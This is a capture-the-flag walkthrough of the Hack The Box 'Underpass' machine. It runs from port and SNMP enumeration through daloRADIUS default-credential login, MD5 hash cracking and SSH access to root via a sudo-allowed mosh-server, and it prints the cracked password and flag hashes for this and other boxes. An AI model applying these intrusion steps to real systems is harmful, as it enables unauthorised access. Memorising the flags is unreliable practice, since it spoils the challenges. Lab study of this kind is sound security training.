

|            |       |
| ---------- | ----- |
| OS         | Linux |
| Difficulty | Easy  |
Start with initial Nmap scan

```bash
┌──(dkvv㉿OMEN)-[~]
└─$ nmap -sC -sV 10.10.11.48
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-07 19:00 IST
Nmap scan report for 10.10.11.48
Host is up (0.29s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.65 seconds
```

Apache service is running on http port 
lets pay a visit

![[Pasted image 20250307190516.png]]

Lets try a UDP port scan now

```bash
──(dkvv㉿OMEN)-[~]
└─$ nmap -sU 10.10.11.48 -T5
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-07 19:07 IST
Warning: 10.10.11.48 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.11.48
Host is up (0.29s latency).
Not shown: 754 open|filtered udp ports (no-response), 245 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 249.47 seconds
```


UDP open port: 161, and you can see that there is an SNMP service enabled SNMP is called Simple Network Management Protocol, and its communication is done via UDP 161 and 162. The SNMP server, which is the managed end where information is queried, uses UDP port 161, and the client uses port 162.

```bash
┌──(dkvv㉿OMEN)-[~]
└─$ snmp-check 10.10.11.48
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.11.48:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.10.11.48
  Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
  Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
  Contact                       : steve@underpass.htb
  Location                      : Nevada, U.S.A. but not Vegas
  Uptime snmp                   : 03:48:39.57
  Uptime system                 : 03:48:29.10
  System date                   : 2025-3-7 13:49:38.0
```

You can see that there is a username of steve@underpass.htb and a daloradius service. In its Github, I found a possible path /var/www/daloradius

Lets try `dirsearch`

```bash
┌──(dkvv㉿OMEN)-[~/Desktop/HTB/Underpass]
└─$ dirsearch -u "http://underpass.htb/daloradius/" -t 50
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50
Wordlist size: 11460

Output File: /home/dkvv/Desktop/HTB/Underpass/reports/http_underpass.htb/_daloradius__25-03-07_19-27-58.txt

Target: http://underpass.htb/

[19:27:58] Starting: daloradius/
[19:28:09] 200 -  221B  - /daloradius/.gitignore
[19:28:32] 301 -  323B  - /daloradius/app  ->  http://underpass.htb/daloradius/app/
[19:28:37] 200 -   24KB - /daloradius/ChangeLog
[19:28:42] 301 -  323B  - /daloradius/doc  ->  http://underpass.htb/daloradius/doc/
[19:28:42] 200 -    2KB - /daloradius/docker-compose.yml
[19:28:42] 200 -    2KB - /daloradius/Dockerfile
[19:28:51] 301 -  327B  - /daloradius/library  ->  http://underpass.htb/daloradius/library/
[19:28:52] 200 -   18KB - /daloradius/LICENSE
[19:29:07] 200 -   10KB - /daloradius/README.md
[19:29:11] 301 -  325B  - /daloradius/setup  ->  http://underpass.htb/daloradius/setup/

Task Completed
```


You can see that there is some environment information environment Scan the app directory again and get login.php

```bash
┌──(dkvv㉿OMEN)-[~/Desktop/HTB/Underpass]
└─$ dirsearch -u "http://underpass.htb/daloradius/app/" -t 50
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/dkvv/Desktop/HTB/Underpass/reports/http_underpass.htb/_daloradius_app__25-03-07_19-33-32.txt

Target: http://underpass.htb/

[19:33:32] Starting: daloradius/app/
[19:34:11] 301 -  330B  - /daloradius/app/common  ->  http://underpass.htb/daloradius/app/common/
[19:34:54] 301 -  329B  - /daloradius/app/users  ->  http://underpass.htb/daloradius/app/users/
[19:34:54] 302 -    0B  - /daloradius/app/users/  ->  home-main.php
[19:34:55] 200 -    2KB - /daloradius/app/users/login.php

Task Completed
```

I found the current utilized version and the deafult credentials in `http://underpass.htb/daloradius/doc/install/INSTALL` 

![[Pasted image 20250307194359.png]]

![[Pasted image 20250307194426.png]]

Since we couldn't successfully login into the `app/users` with this credentials. Lets search for other endpoints.

There is another point with `app/operators` where you can login with default credentials.
![[Pasted image 20250307195331.png]]

After successful login  there is list of users with hashed password.

![[Pasted image 20250307195255.png]]

I understood its a MD5 hash and utilised JTR to crack it

```bash
┌──(dkvv㉿OMEN)-[~/Desktop/HTB/Underpass]
└─$ john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=20
Press 'q' or Ctrl-C to abort, almost any other key for status
underwaterfriends (?)     
1g 0:00:00:00 DONE (2025-03-07 20:05) 5.555g/s 16578Kp/s 16578Kc/s 16578KC/s undiamecaiQ..underpants2
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```
user:  svcMosh
password:   underwaterfriends

### User flag

Lets login to the ssh port using the creds and get our user flag

![[Pasted image 20250307201033.png]]

bbf12f4f01fae97348e753e556908d5f

### Privilege Escalation

_The first thing we check when attempting privilege escalation is_ `_sudo -l_`
sudo -l

_When encountering a new command or service for the first time, reading the manual is always a good practice:_

**_Description_**`_mosh-server_` _is a helper program for the remote terminal application_ `_mosh(1)_`_._

`_mosh-server_` _connects on a high UDP port and selects an encryption key to secure the session. The program outputs both the port and key information to standard output, detaches from the terminal, and waits for a_ `_mosh_` _client to establish a connection. The program will terminate if no client connects within 60 seconds._

```bash
svcMosh@underpass:/$ mosh-server


MOSH CONNECT 60002 Sf+15vHGBDFjZ8KCw5nZyA

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
```


change the port

```bash
svcMosh@underpass:/$ sudo /usr/bin/mosh-server new -p 61113


MOSH CONNECT 61113 LdkbnRfKuL9BKAgpoTf1pQ

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
```

Now enter mosh cmd to connect to local host

```bash
svcMosh@underpass:/tmp$ mosh --server="sudo /usr/bin/mosh-server" localhost
```

then you can get the root flag
![[Pasted image 20250307201930.png]]


9765eb22ef458149b6681fdb112c1159



## linkvortex
https://www.hyhforever.top/htb-linkvortex/

1b9087794a86604d3d2f74c2202e7869

69dd2ed6ca31f9121f26f9c7da3ad695

## Chemistry

https://telegra.ph/CIF-Analyzer-10-28

d308388c8579f403943e0128eb7c6e3d

50170401ed0033a1ed3694fc067689ed


